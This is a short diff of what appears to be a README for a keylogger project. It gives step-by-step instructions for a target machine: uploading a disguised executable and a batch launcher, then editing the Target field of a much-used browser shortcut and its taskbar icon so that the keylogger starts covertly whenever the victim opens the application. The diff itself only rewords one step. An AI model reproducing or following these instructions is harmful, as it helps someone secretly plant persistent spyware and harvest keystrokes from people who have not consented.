@@ -32,7 +32,7 @@ On target system:
 
 2). Upload crash_backup.exe, Visuals.txt, and launch.bat - create a folder to house these files.  Ex: C:\Config\Visuals.txt, C:\Config\crash_backup.exe, C:\Config\launch.bat.
 
-3). Find a desktop shortcut that seems to get a lot of use, like a browser.  Right click the shortcut, then click properties.  Change the address in the Target field to be that of launch.bat.  When this shortcut is used, it will also start our keylogger.
+3). Find a "high use" desktop shortcut, like a browser.  Right click the shortcut, then click properties.  Change the address in the Target field to be that of launch.bat.  When this shortcut is used, it will also start our keylogger.
 
 Also do this for the equivalent taskbar/toolbar icon if it exists: right click the icon, then right click the application name in the jump list and click Properties.  Change the Target field in the same way as above.  
 
